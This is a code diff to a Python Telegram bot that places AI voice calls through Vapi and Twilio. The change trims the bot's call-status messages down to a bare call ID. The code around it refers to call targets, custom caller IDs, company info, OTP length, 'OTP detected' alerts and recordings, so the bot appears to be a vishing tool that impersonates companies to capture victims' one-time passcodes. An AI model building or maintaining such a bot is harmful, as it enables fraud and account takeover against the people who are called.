@@ -2694,11 +2694,7 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 
                 bot.send_message(
                     chat_id,
-                    f"🎭 **Vapi emotion call initiated!**\n\n"
-                    f"Call ID: `{vapi_call_id}`\n"
-                    f"Target: {name}\n"
-                    f"Emotion: {emotion}\n\n"
-                    f"📍 Live updates will appear as the call progresses."
+                    f"🎭 Call ID: {vapi_call_id}"
                 )
                 
                 try:
@@ -2753,7 +2749,6 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
             return
 
         caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
-        bot.send_message(chat_id, "✨ Starting Normal Call. Live updates will be available shortly.")
 
         def _start():
             try:
@@ -2789,7 +2784,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                     f"• OTP length: {code_length}\n"
                     f"• Mode: {mode_label}\n"
                 )
-                bot.send_message(chat_id, f"✨ Starting Normal Call with current setup:\n\n{setup_summary}")
+                bot.send_message(chat_id, setup_summary)
 
                 # Build Vapi call metadata from user settings
                 from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
@@ -2873,21 +2868,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 except Exception:
                     logger.exception("Failed to store call metadata")
 
-                # Send confirmation to user with live updates notice
-                confirmation_text = (
-                    f"🎯 **Vapi call initiated!**\n\n"
-                    f"Call ID: `{vapi_call_id}`\n"
-                    f"Target: {name}\n"
-                    f"Number: {phonenum}\n\n"
-                    f"📍 Live updates will appear below as the call progresses:\n"
-                    f"• 🔔 Ringing\n"
-                    f"• ✅ Answered\n"
-                    f"• 💬 Transcript updates\n"
-                    f"• 🔐 OTP detected\n"
-                    f"• 🎙️ Recording saved\n"
-                    f"• ✋ Call ended"
-                )
-                bot.send_message(chat_id, confirmation_text, parse_mode="Markdown")
+                bot.send_message(chat_id, f"🎯 Call ID: {vapi_call_id}")
 
                 # Clear per-user call setup immediately after initiating the call
                 try:
